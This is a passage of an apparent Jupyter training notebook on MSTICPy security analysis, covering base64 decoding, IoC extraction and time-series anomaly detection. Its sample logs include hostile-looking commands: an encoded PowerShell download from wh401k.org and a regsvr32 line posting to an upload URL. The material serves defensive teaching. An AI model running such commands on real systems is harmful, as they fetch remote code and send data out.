       "      <td>.\\powershell  -enc LU5vbmludGVyYWN0aXZlIC1Ob3Byb2ZpbGUgLUNvbW1hbmQgIkludm9rZS1FeHByZXNzaW9uIEdldC1Qcm9jZXNzOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpIGh0dHA6Ly93aDQwMWsub3JnL2dldHBzIg==</td>\n",
       "      <td>.\\powershell  -enc &lt;decoded type='string' name='[None]' index='1' depth='1'&gt;-Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"&lt;/dec...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>(, 1., 1)</td>\n",
       "      <td>LU5vbmludGVyYWN0aXZlIC1Ob3Byb2ZpbGUgLUNvbW1hbmQgIkludm9rZS1FeHByZXNzaW9uIEdldC1Qcm9jZXNzOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpIGh0dHA6Ly93aDQwMWsub3JnL2dldHBzIg==</td>\n",
       "      <td>unknown</td>\n",
       "      <td>None</td>\n",
       "      <td>b'-Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"'</td>\n",
       "      <td>-Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"</td>\n",
       "      <td>utf-8</td>\n",
       "      <td>{'md5': '65716544c3db642171b7597cd3deca2b', 'sha1': '8aa4c81d51732addabcaa5d8f121c79b0923189f', 'sha256': '828cce6aec56c6cc50b35041381f7d11a8d9c3cd0893625a45ed611875910fa8'}</td>\n",
       "      <td>65716544c3db642171b7597cd3deca2b</td>\n",
       "      <td>8aa4c81d51732addabcaa5d8f121c79b0923189f</td>\n",
       "      <td>828cce6aec56c6cc50b35041381f7d11a8d9c3cd0893625a45ed611875910fa8</td>\n",
       "      <td>2d 4e 6f 6e 69 6e 74 65 72 61 63 74 69 76 65 20 2d 4e 6f 70 72 6f 66 69 6c 65 20 2d 43 6f 6d 6d 61 6e 64 20 22 49 6e 76 6f 6b 65 2d 45 78 70 72 65 73 73 69 6f 6e 20 47 65 74 2d 50 72 6f 63 65 73 7...</td>\n",
       "      <td>7452</td>\n",
       "      <td>.\\powershell  -enc LU5vbmludGVyYWN0aXZlIC1Ob3Byb2ZpbGUgLUNvbW1hbmQgIkludm9rZS1FeHByZXNzaW9uIEdldC1Qcm9jZXNzOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpIGh0dHA6Ly93aDQwMWsub3JnL2dldHBzIg==</td>\n",
       "      <td>.\\powershell  -enc &lt;decoded type='string' name='[None]' index='1' depth='1'&gt;-Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"&lt;/dec...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   reference  \\\n",
       "0  (, 1., 1)   \n",
       "1  (, 1., 1)   \n",
       "\n",
       "                                                                                                                                                original_string  \\\n",
       "0  LU5vbmludGVyYWN0aXZlIC1Ob3Byb2ZpbGUgLUNvbW1hbmQgIkludm9rZS1FeHByZXNzaW9uIEdldC1Qcm9jZXNzOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpIGh0dHA6Ly93aDQwMWsub3JnL2dldHBzIg==   \n",
       "1  LU5vbmludGVyYWN0aXZlIC1Ob3Byb2ZpbGUgLUNvbW1hbmQgIkludm9rZS1FeHByZXNzaW9uIEdldC1Qcm9jZXNzOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpIGh0dHA6Ly93aDQwMWsub3JnL2dldHBzIg==   \n",
       "\n",
       "  file_name file_type  \\\n",
       "0   unknown      None   \n",
       "1   unknown      None   \n",
       "\n",
       "                                                                                                              input_bytes  \\\n",
       "0  b'-Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"'   \n",
       "1  b'-Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"'   \n",
       "\n",
       "                                                                                                        decoded_string  \\\n",
       "0  -Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"   \n",
       "1  -Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"   \n",
       "\n",
       "  encoding_type  \\\n",
       "0         utf-8   \n",
       "1         utf-8   \n",
       "\n",
       "                                                                                                                                                                     file_hashes  \\\n",
       "0  {'md5': '65716544c3db642171b7597cd3deca2b', 'sha1': '8aa4c81d51732addabcaa5d8f121c79b0923189f', 'sha256': '828cce6aec56c6cc50b35041381f7d11a8d9c3cd0893625a45ed611875910fa8'}   \n",
       "1  {'md5': '65716544c3db642171b7597cd3deca2b', 'sha1': '8aa4c81d51732addabcaa5d8f121c79b0923189f', 'sha256': '828cce6aec56c6cc50b35041381f7d11a8d9c3cd0893625a45ed611875910fa8'}   \n",
       "\n",
       "                                md5                                      sha1  \\\n",
       "0  65716544c3db642171b7597cd3deca2b  8aa4c81d51732addabcaa5d8f121c79b0923189f   \n",
       "1  65716544c3db642171b7597cd3deca2b  8aa4c81d51732addabcaa5d8f121c79b0923189f   \n",
       "\n",
       "                                                             sha256  \\\n",
       "0  828cce6aec56c6cc50b35041381f7d11a8d9c3cd0893625a45ed611875910fa8   \n",
       "1  828cce6aec56c6cc50b35041381f7d11a8d9c3cd0893625a45ed611875910fa8   \n",
       "\n",
       "                                                                                                                                                                                           printable_bytes  \\\n",
       "0  2d 4e 6f 6e 69 6e 74 65 72 61 63 74 69 76 65 20 2d 4e 6f 70 72 6f 66 69 6c 65 20 2d 43 6f 6d 6d 61 6e 64 20 22 49 6e 76 6f 6b 65 2d 45 78 70 72 65 73 73 69 6f 6e 20 47 65 74 2d 50 72 6f 63 65 73 7...   \n",
       "1  2d 4e 6f 6e 69 6e 74 65 72 61 63 74 69 76 65 20 2d 4e 6f 70 72 6f 66 69 6c 65 20 2d 43 6f 6d 6d 61 6e 64 20 22 49 6e 76 6f 6b 65 2d 45 78 70 72 65 73 73 69 6f 6e 20 47 65 74 2d 50 72 6f 63 65 73 7...   \n",
       "\n",
       "   src_index  \\\n",
       "0        968   \n",
       "1       7452   \n",
       "\n",
       "                                                                                                                                                                       CommandLine  \\\n",
       "0  .\\powershell  -enc LU5vbmludGVyYWN0aXZlIC1Ob3Byb2ZpbGUgLUNvbW1hbmQgIkludm9rZS1FeHByZXNzaW9uIEdldC1Qcm9jZXNzOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpIGh0dHA6Ly93aDQwMWsub3JnL2dldHBzIg==   \n",
       "1  .\\powershell  -enc LU5vbmludGVyYWN0aXZlIC1Ob3Byb2ZpbGUgLUNvbW1hbmQgIkludm9rZS1FeHByZXNzaW9uIEdldC1Qcm9jZXNzOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpIGh0dHA6Ly93aDQwMWsub3JnL2dldHBzIg==   \n",
       "\n",
       "                                                                                                                                                                                       full_decoded_string  \n",
       "0  .\\powershell  -enc <decoded type='string' name='[None]' index='1' depth='1'>-Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"</dec...  \n",
       "1  .\\powershell  -enc <decoded type='string' name='[None]' index='1' depth='1'>-Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"</dec...  "
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# using the pandas msticpy accessor\n",
    "dec_df = process_enc_logs.mp.b64extract(column='CommandLine')\n",
    "\n",
    "# display dataframe\n",
    "display(dec_df)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-17T18:21:27.532198Z",
     "start_time": "2022-10-17T18:21:27.526776Z"
    }
   },
   "source": [
    "---\n",
    "\n",
    "# <a style=\"border: solid; padding:5pt; color:black; background-color:#909090\">IoC extraction using msticpy</a>\n",
    "\n",
    "---\n",
    "\n",
    "This module allows you to extract IoC patterns from a string or a DataFrame. This will be useful feature for defender for faster extraction and perform follow-up activities on those IoCs.\n",
    "\n",
    "For more detail - [IoC Extraction](https://msticpy.readthedocs.io/en/latest/data_analysis/IoCExtract.html)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "You can use this module similar fashion either by providing input string or passing a dataframe with multiple logs containing IoCs.\n",
    "\n",
    "Enter sample command line in the next cell to see how it works. \n",
    "`netsh  start capture=yes IPv4.Address=1.2.3.4 tracefile=C:\\\\Users\\\\user\\\\AppData\\\\Local\\\\Temp\\\\bzzzzzz.txt`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-27T15:37:52.061396Z",
     "start_time": "2022-10-27T15:37:52.049098Z"
    }
   },
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c75c34744f064cc484c3e77367b48b91",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Text(value='', description='Enter a commandline to extract IoCs', layout=Layout(width='50%'), style=Descriptio…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "cmdline = mp.nbwidgets.GetText(prompt='Enter a commandline to extract IoCs', auto_display=True);"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "You can use the `extract` method from `iocextract` class and provide input string."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-27T15:38:00.337031Z",
     "start_time": "2022-10-27T15:38:00.325162Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "    <style>\n",
       "        .table_mod {border-collapse: collapse; width: 50%;}\n",
       "        .cell_mod {border: 1px solid #ddd !important;\n",
       "            text-align: left !important; padding: 15px !important;}\n",
       "    </style>\n",
       "    <h4>Modules matching 'ioc'</h4>\n",
       "    <table class='table_mod'>\n",
       "    <tr class='cell_mod'><th>Module</th><th>Help</th></tr>\n",
       "    <tr class='cell_mod'><td>msticpy.transform.iocextract</td><td><a href=https://msticpy.readthedocs.io/en/latest/api/msticpy.transform.iocextract.html target='_blank'>msticpy.transform.iocextract</a></td></tr>\n",
       "    </table>\n",
       "    "
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Find the module path\n",
    "mp.search('ioc')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-27T15:38:05.159439Z",
     "start_time": "2022-10-27T15:38:05.148579Z"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Potential IoCs found in alert process:\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "defaultdict(set,\n",
       "            {'ipv4': {'1.2.3.4'},\n",
       "             'windows_path': {'C:\\\\\\\\Users\\\\\\\\user\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp\\\\\\\\bzzzzzz.txt'}})"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "ioc_extractor = mp.transform.IoCExtract()\n",
    "\n",
    "# any IoCs in the string?\n",
    "iocs_found = ioc_extractor.extract(cmdline.value)\n",
    "\n",
    "if iocs_found:\n",
    "    print('\\nPotential IoCs found in alert process:')\n",
    "    display(iocs_found)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-17T18:22:13.457405Z",
     "start_time": "2022-10-17T18:22:13.452500Z"
    }
   },
   "source": [
    "## <a style=\"border: solid; padding:5pt; color:black; background-color:#309030\">Task 2 - Extract IoCs from log dataset</a>\n",
    "\n",
    "Perform IoC extraction on the data loaded from previous step (process_enc_logs).\n",
    "1. Choose the columns containing command line logs which may have IoCs and need to be extracted.\n",
    "2. Use either of these (use Python help to find correct parameters such as input data and column name):\n",
    "   - the DataFrame accessor process_enc_logs.mp.iocextract() function\n",
    "   - the `extract` method of the `mp.transform.IoCextractor` class\n",
    "3. Finally display the results\n",
    "\n",
    "\n",
    "<br>\n",
    "<details>\n",
    "<summary>Hints...</summary>\n",
    "<li>Use the cell below to identify the columns containing powershell base64 encoded logs.</li>\n",
    "<li>Use data and column to specify input dataframe and column containing powershell commandline</li>\n",
    "<li>Use the DataFrame accessor\n",
    "<pre>\n",
    "    process_logs.mp.iocextract(columns='CommandLine')\n",
    "</pre>\n",
    "</li>\n",
    "<li>Or use the IoCExtract class method\n",
    "<pre>\n",
    "    ioc_extractor.extract(data=process_enc_logs, columns=['CommandLine'])\n",
    "</pre>\n",
    "</li>\n",
    "<ul>\n",
    "</ul>\n",
    "</details>\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-27T15:38:21.575507Z",
     "start_time": "2022-10-27T15:38:19.601429Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<h3>IoC patterns found in process tree.</h3>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>IoCType</th>\n",
       "      <th>Observable</th>\n",
       "      <th>SourceIndex</th>\n",
       "      <th>Input</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>275</th>\n",
       "      <td>url</td>\n",
       "      <td>http://wh401k.org/getps</td>\n",
       "      <td>967</td>\n",
       "      <td>.\\powershell  -Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>461</th>\n",
       "      <td>url</td>\n",
       "      <td>http://www.401k.com/upload?pass=34592389</td>\n",
       "      <td>6091</td>\n",
       "      <td>.\\regsvr32  /u /s c:\\windows\\fonts\\csrss.exe \"http://www.401k.com/upload?pass=34592389\" post</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>736</th>\n",
       "      <td>url</td>\n",
       "      <td>http://wh401k.org/getps</td>\n",
       "      <td>7451</td>\n",
       "      <td>.\\powershell  -Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1960</th>\n",
       "      <td>url</td>\n",
       "      <td>https://clients2.google.com/cr/report</td>\n",
       "      <td>9158</td>\n",
       "      <td>\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\72.0.3626.96\\Installer\\setup.exe\" --type=crashpad-handler /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler --database=C:\\Windows\\TEMP\\...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1962</th>\n",
       "      <td>url</td>\n",
       "      <td>https://clients2.google.com/cr/report</td>\n",
       "      <td>9160</td>\n",
       "      <td>C:\\Windows\\TEMP\\CR_42BC8.tmp\\setup.exe --type=crashpad-handler /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler --database=C:\\Windows\\TEMP\\Crashpad --url=https://clients2.google.com/cr...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "     IoCType                                Observable  SourceIndex  \\\n",
       "275      url                   http://wh401k.org/getps          967   \n",
       "461      url  http://www.401k.com/upload?pass=34592389         6091   \n",
       "736      url                   http://wh401k.org/getps         7451   \n",
       "1960     url     https://clients2.google.com/cr/report         9158   \n",
       "1962     url     https://clients2.google.com/cr/report         9160   \n",
       "\n",
       "                                                                                                                                                                                                        Input  \n",
       "275                                                                         .\\powershell  -Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"  \n",
       "461                                                                                                              .\\regsvr32  /u /s c:\\windows\\fonts\\csrss.exe \"http://www.401k.com/upload?pass=34592389\" post  \n",
       "736                                                                         .\\powershell  -Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"  \n",
       "1960  \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\72.0.3626.96\\Installer\\setup.exe\" --type=crashpad-handler /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler --database=C:\\Windows\\TEMP\\...  \n",
       "1962  C:\\Windows\\TEMP\\CR_42BC8.tmp\\setup.exe --type=crashpad-handler /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler --database=C:\\Windows\\TEMP\\Crashpad --url=https://clients2.google.com/cr...  "
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "ioc_df = ioc_extractor.extract(data=process_logs, columns=['CommandLine'])\n",
    "\n",
    "if len(ioc_df):\n",
    "    display(HTML(\"<h3>IoC patterns found in process tree.</h3>\"))\n",
    "    display(ioc_df[ioc_df['IoCType']=='url'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-27T15:38:41.034981Z",
     "start_time": "2022-10-27T15:38:39.106022Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<h3>IoC patterns found in process tree.</h3>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>IoCType</th>\n",
       "      <th>Observable</th>\n",
       "      <th>SourceIndex</th>\n",
       "      <th>Input</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>ipv4</td>\n",
       "      <td>127.0.0.1</td>\n",
       "      <td>5</td>\n",
       "      <td>ping  127.0.0.1 -n 15</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>ipv4</td>\n",
       "      <td>127.0.0.1</td>\n",
       "      <td>7</td>\n",
       "      <td>ping  127.0.0.1 -n 15</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>ipv4</td>\n",
       "      <td>127.0.0.1</td>\n",
       "      <td>9</td>\n",
       "      <td>ping  127.0.0.1 -n 15</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>ipv4</td>\n",
       "      <td>127.0.0.1</td>\n",
       "      <td>11</td>\n",
       "      <td>ping  127.0.0.1 -n 15</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>ipv4</td>\n",
       "      <td>127.0.0.1</td>\n",
       "      <td>13</td>\n",
       "      <td>ping  127.0.0.1 -n 15</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2086</th>\n",
       "      <td>ipv4</td>\n",
       "      <td>127.0.0.1</td>\n",
       "      <td>9856</td>\n",
       "      <td>ping  127.0.0.1 -n 29</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2087</th>\n",
       "      <td>ipv4</td>\n",
       "      <td>127.0.0.1</td>\n",
       "      <td>9858</td>\n",
       "      <td>ping  127.0.0.1 -n 29</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2093</th>\n",
       "      <td>ipv4</td>\n",
       "      <td>127.0.0.1</td>\n",
       "      <td>9891</td>\n",
       "      <td>ping  127.0.0.1 -n 18</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2094</th>\n",
       "      <td>ipv4</td>\n",
       "      <td>127.0.0.1</td>\n",
       "      <td>9895</td>\n",
       "      <td>ping  127.0.0.1 -n 10</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2095</th>\n",
       "      <td>ipv4</td>\n",
       "      <td>127.0.0.1</td>\n",
       "      <td>9897</td>\n",
       "      <td>ping  127.0.0.1 -n 8</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>337 rows × 4 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "     IoCType Observable  SourceIndex                   Input\n",
       "1       ipv4  127.0.0.1            5  ping  127.0.0.1 -n 15 \n",
       "2       ipv4  127.0.0.1            7  ping  127.0.0.1 -n 15 \n",
       "3       ipv4  127.0.0.1            9  ping  127.0.0.1 -n 15 \n",
       "4       ipv4  127.0.0.1           11  ping  127.0.0.1 -n 15 \n",
       "5       ipv4  127.0.0.1           13  ping  127.0.0.1 -n 15 \n",
       "...      ...        ...          ...                     ...\n",
       "2086    ipv4  127.0.0.1         9856  ping  127.0.0.1 -n 29 \n",
       "2087    ipv4  127.0.0.1         9858  ping  127.0.0.1 -n 29 \n",
       "2093    ipv4  127.0.0.1         9891  ping  127.0.0.1 -n 18 \n",
       "2094    ipv4  127.0.0.1         9895  ping  127.0.0.1 -n 10 \n",
       "2095    ipv4  127.0.0.1         9897   ping  127.0.0.1 -n 8 \n",
       "\n",
       "[337 rows x 4 columns]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "ioc_df = process_logs.mp.ioc_extract(columns='CommandLine')\n",
    "\n",
    "if len(ioc_df):\n",
    "    display(HTML(\"<h3>IoC patterns found in process tree.</h3>\"))\n",
    "    display(ioc_df[ioc_df['IoCType']=='ipv4'])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---\n",
    "\n",
    "# <a style=\"border: solid; padding:5pt; color:black; background-color:#909090\">Time Series analysis using msticpy</a>\n",
    "\n",
    "---\n",
    "\n",
    "MSTICPy has functions to calculate and display time series decomposition results. These can be useful to spot time-based anomalies in something that has a predictable seasonal pattern\n",
    "\n",
    "Fore more details , check the documentation\n",
    "[Time Series Analysis](https://msticpy.readthedocs.io/en/latest/visualization/TimeSeriesAnomalies.html)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-27T15:38:51.092994Z",
     "start_time": "2022-10-27T15:38:51.081015Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "    <style>\n",
       "        .table_mod {border-collapse: collapse; width: 50%;}\n",
       "        .cell_mod {border: 1px solid #ddd !important;\n",
       "            text-align: left !important; padding: 15px !important;}\n",
       "    </style>\n",
       "    <h4>Modules matching 'timeseries'</h4>\n",
       "    <table class='table_mod'>\n",
       "    <tr class='cell_mod'><th>Module</th><th>Help</th></tr>\n",
       "    <tr class='cell_mod'><td>msticpy.analysis.timeseries</td><td><a href=https://msticpy.readthedocs.io/en/latest/api/msticpy.analysis.timeseries.html target='_blank'>msticpy.analysis.timeseries</a></td></tr>\n",
       "<tr class='cell_mod'><td>msticpy.vis.timeseries</td><td><a href=https://msticpy.readthedocs.io/en/latest/api/msticpy.vis.timeseries.html target='_blank'>msticpy.vis.timeseries</a></td></tr>\n",
       "    </table>\n",
       "    "
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "mp.search('timeseries')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "MSTICPy has a number of built-in queries for MS Sentinel to support time series analysis.\n",
    "\n",
    "- MultiDataSource.get_timeseries_anomalies\n",
    "- MultiDataSource.get_timeseries_data\n",
    "- MultiDataSource.get_timeseries_decompose\n",
    "- MultiDataSource.plot_timeseries_datawithbaseline\n",
    "- MultiDataSource.plot_timeseries_scoreanomolies\n",
    "\n",
    "To use these you will need to connect to sentinel workspace\n",
    "\n",
    "`# Authentication\n",
    "qry_prov = mp.QueryProvider(\"MSSentinel\")\n",
    "qry_prov.connect(mp.WorkspaceConfig(workspace=\"cybersecuritysoc\"))`\n",
    "\n",
    "```\n",
    "#Specify start and end timestamps\n",
    "start='2022-09-01 00:00:00.000000'\n",
    "end='2020-10-01 00:00:00.000000'\n",
    "\n",
    "#Execute the query by passing required and optional parameters\n",
    "time_series_data = qry_prov.MultiDataSource.get_timeseries_data(\n",
    "    start=start,\n",
    "    end=end,\n",
    "    table=\"CommonSecurityLog\",\n",
    "    timestampcolumn=\"TimeGenerated\",\n",
    "    aggregatecolumn=\"SentBytes\",\n",
    "    groupbycolumn=\"DeviceVendor\",\n",
    "    aggregatefunction=\"sum(SentBytes)\",\n",
    "    where_clause='| where DeviceVendor==\"Fortinet\"',\n",
    "    add_query_items='| mv-expand TimeGenerated to typeof(datetime), SentBytes to typeof(long)',\n",
    ")\n",
    "#display the output\n",
    "time_series_data\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "An example of running the query against connected sentinel workspace and retrieve the time series data."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## <a style=\"border: solid; padding:5pt; color:black; background-color:#309030\">Task 3 - Find outliers using time series analysis on network data</a>\n",
    "\n",
    "Perform Time series analysis on the sample data loaded in the first step.\n",
    "1. from the loaded dataframe, use python help (`ts_df.mp_timeseries.analyze`) to find correct parameters such as data_column, seasonal parameteres if known otherwise keep default.\n",
    "3. Finally plot the time series of the results from previous steps using `ts_decomp_df.mp_timeseries.plot`\n",
    "\n",
    "<br>\n",
    "<details>\n",
    "<summary>Hints...</summary>\n",
    "<li>Use the cell below to identify the columns containing time series numerical data.</li>\n",
    "<li>The final command to do time series should look like:\n",
    "<pre>\n",
    "    ts_df.mp_timeseries.analyze(\n",
    "        # time_column=\"TimeGenerated\"  - if the DF is not indexed by timestamp\n",
    "        data_column=\"TotalBytesSent\",\n",
    "        seasonal=7,\n",
    "        period=24\n",
    "    )\n",
    "</pre>\n",
    "</li>\n",
    "<li>You can also plot the results and outliers using the command.\n",
    "<pre>\n",
    "    ts_decomp_df.mp_timeseries.plot(\n",
    "        y=\"TotalBytesSent\",\n",
    "    );\n",
    "</pre>\n",
    "</li>\n",
    "<ul>\n",
    "</ul>\n",
    "</details>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-27T15:50:11.487393Z",
     "start_time": "2022-10-27T15:50:11.472761Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>TotalBytesSent</th>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>TimeGenerated</th>\n",
       "      <th></th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>2020-07-06 00:00:00+00:00</th>\n",
       "      <td>10823</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2020-07-06 01:00:00+00:00</th>\n",
       "      <td>14821</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2020-07-06 02:00:00+00:00</th>\n",
       "      <td>13532</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2020-07-06 03:00:00+00:00</th>\n",
       "      <td>11947</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2020-07-06 04:00:00+00:00</th>\n",
       "      <td>11193</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2020-07-12 19:00:00+00:00</th>\n",
       "      <td>18166</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2020-07-12 20:00:00+00:00</th>\n",
       "      <td>13830</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2020-07-12 21:00:00+00:00</th>\n",
       "      <td>13350</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2020-07-12 22:00:00+00:00</th>\n",
       "      <td>11842</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2020-07-12 23:00:00+00:00</th>\n",
